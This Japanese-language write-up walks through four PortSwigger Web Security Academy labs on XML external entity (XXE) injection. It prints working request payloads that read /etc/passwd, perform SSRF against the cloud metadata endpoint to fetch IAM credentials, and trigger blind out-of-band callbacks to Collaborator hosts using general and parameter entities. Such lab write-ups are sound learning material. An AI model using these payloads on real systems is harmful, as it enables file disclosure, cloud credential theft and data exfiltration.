# XXE writeup
- [XXE writeup](#xxe-writeup)
  - [****Exploiting XXE using external entities to retrieve files****](#exploitingxxeusing-external-entities-to-retrieve-files)
  - [****Exploiting XXE to perform SSRF attacks****](#exploiting-xxe-to-perform-ssrf-attacks)
  - [****Blind XXE with out-of-band interaction****](#blindxxewith-out-of-band-interaction)
  - [****Blind XXE with out-of-band interaction via XML parameter entities****](#blind-xxewith-out-of-band-interaction-via-xml-parameter-entities)

## ****Exploiting XXE using external entities to retrieve files****

---

`TOP > View details > Check stok`を押すと、 以下のようなrequest・responseが帰ってきます。

```xml
POST /product/stock HTTP/2
Host: 0a80002b03e9457186e86d0a00f700f7.web-security-academy.net
<readacted>

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>

HTTP/2 200 OK
Content-Type: text/plain; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 3

265
```

今回はやるだけ。なので特にいうことがない気がします

```xml
POST /product/stock HTTP/2
Host: 0a80002b03e9457186e86d0a00f700f7.web-security-academy.net
<readacted>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE hoge [<!ENTITY fuga SYSTEM "file:///etc/passwd">]> 

<stockCheck><productId>
&fuga;</productId><storeId>
1</storeId></stockCheck>
```

## ****Exploiting XXE to perform SSRF attacks****

---

`http://169.254.169.254/` に対してバックエンドHTTP Requestを送ればよさそうです。

TOP > View details > Check stockを押下すると以下のようなリクエストが飛びます。

```
POST /product/stock HTTP/2
Host: 0aaf002803d2727e806844280079005a.web-security-academy.net
<redacted>

<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

productIdを1000などにすると`"No such product or store”` と言われます。

以下のようにして送ってみると、`"Invalid product ID: latest”` と言われます。

```
POST /product/stock HTTP/2
Host: 0aaf002803d2727e806844280079005a.web-security-academy.net
<redacted>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE fuga [<!ENTITY hoge SYSTEM "http://169.254.169.254/">]>
<stockCheck><productId>&hoge;</productId><storeId>1</storeId></stockCheck>
```

latestが階層へのヒントであるため繰り返していけば終わりです。

```
POST /product/stock HTTP/2
Host: 0aaf002803d2727e806844280079005a.web-security-academy.net
<redacted>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE fuga [<!ENTITY hoge SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin">]>
<stockCheck><productId>&hoge;</productId><storeId>1</storeId></stockCheck>
```

## ****Blind XXE with out-of-band interaction****

---

脆弱性がある箇所は前と一緒です。

そしてやることも**`Exploiting XXE to perform SSRF attacks`**のラボと大体一緒です。

```xml
<!DOCTYPE fuga [<!ENTITY xxe SYSTEM "http://l3p0eutk9j4hc5z0fu6xlv3bm2stgj48.oastify.com" > ] >
```

```xml
POST /product/stock HTTP/2
Host: 0a560065037a7028867ae85f00b000ac.web-security-academy.net
<readcted>

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE fuga [<!ENTITY xxe SYSTEM "http://l3p0eutk9j4hc5z0fu6xlv3bm2stgj48.oastify.com" > ] >
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

## ****Blind XXE with out-of-band interaction via XML parameter entities****

---

前回までのラボと特に脆弱性のある箇所は変わっていません。

無効なproductIdを投げた時は、`"Invalid product ID”` となり入力値の結果はエコーバックしなさそうです。

つまり、Blindを試す必要がありそうです。

```xml
POST /product/stock HTTP/2
Host: 0a73002003919be98139572b0097007f.web-security-academy.net
Cookie: session=vj63H6l0rIE6g6v3SOZftE5bFctyhnva
<redacted>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE fuga [<!ENTITY xxe SYSTEM "http://1uwg5ak00zvx3lqg6axdcburdij971vq.oastify.com">]>
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```

このように送ってみると、`"Entities are not allowed for security reasons”` と怒られます。

ということでここで役に立つのがXML Parameter Entityです。

```xml
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://o4t3fxunam5kd803gx70my4en5twht5i.oastify.com" > %xxe; ]>
```

上記を使いラボを終了させます。(http以下は、自身のCollaboratorを使用してください)

```xml
POST /product/stock HTTP/2
Host: 0a73002003919be98139572b0097007f.web-security-academy.net
Cookie: session=vj63H6l0rIE6g6v3SOZftE5bFctyhnva
<redacted>

<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://o4t3fxunam5kd803gx70my4en5twht5i.oastify.com" > %xxe; ]>
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
